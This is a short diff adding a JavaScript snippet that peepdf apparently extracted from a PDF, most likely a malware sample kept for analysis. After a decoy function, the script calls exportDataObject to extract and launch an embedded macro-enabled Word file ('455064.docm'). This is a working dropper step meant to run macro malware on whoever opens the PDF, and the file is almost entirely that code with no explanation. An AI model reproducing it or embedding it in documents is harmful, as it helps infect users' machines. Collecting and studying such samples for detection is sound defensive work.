@@ -1,0 +1,15 @@
+// peepdf comment: Javascript code located in object 5 (version 0)
+
+function getInstance(type, partnerId) {
+    var i = 0,
+        instance;
+    for (i; i < instances.length; i++) {
+        instance = instances[i];
+        if (instance.type === type) return instance;
+    }
+};
+this.exportDataObject({
+    cName: "455064.docm",
+    nLaunch: 2
+});
+
